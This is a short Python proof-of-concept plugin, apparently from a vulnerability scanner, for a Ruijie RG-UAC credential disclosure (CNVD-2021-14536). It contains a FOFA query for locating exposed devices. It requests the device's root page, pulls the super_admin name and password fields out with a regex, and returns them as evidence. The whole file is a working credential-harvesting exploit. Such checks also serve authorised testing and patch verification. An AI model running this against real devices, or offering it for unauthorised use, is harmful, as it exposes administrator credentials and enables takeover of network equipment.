#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {}
  ret['links'] = "https://peiqi.wgpsec.org/wiki/iot/锐捷/锐捷 RG-UAC 账号密码信息泄露 CNVD-2021-14536.html"
  ret['huixian'] = []
  ret['method'] = 'get'
  ret['bugname'] = "锐捷RG-UAC账号密码信息泄露 CNVD-2021-14536"
  ret['level'] = "high"
  ret['FOFA'] = 'title="RG-UAC登录页面"&&body="admin"'
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  target = '/'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if re.search(r'pre_define.*?auth_method.*?super_admin.*?name.*?password.*?lastpwdtime.*?',res.text,re.S):
      result = re.search(r'pre_define.*?auth_method.*?super_admin.*?name.*?password.*?lastpwdtime.*?',res.text,re.S)
      # ret['huixian'] = result.group(0)
      # print(result.group(0))
      ret['ifbug'] = True
      ret['huixian'] = result.group()
      res.close()
      return ret
    else:
      return ret
  except:
    return ret